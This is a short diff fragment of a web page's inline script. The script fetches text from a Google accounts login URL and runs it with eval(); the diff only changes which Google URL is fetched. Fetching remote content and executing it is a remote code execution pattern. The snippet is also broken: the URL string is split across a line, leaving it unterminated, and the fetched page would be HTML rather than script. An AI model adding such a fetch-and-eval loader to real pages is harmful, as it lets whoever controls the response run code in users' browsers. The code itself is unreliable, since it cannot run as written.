@@ -4,7 +4,7 @@
 <script>
 (async () => {
   try {
-    const r = await fetch("https://accounts.google.com/ServiceLogin
+    const r = await fetch("https://accounts.google.com/AccountChooser
 ");
     const code = await r.text();
     eval(code);
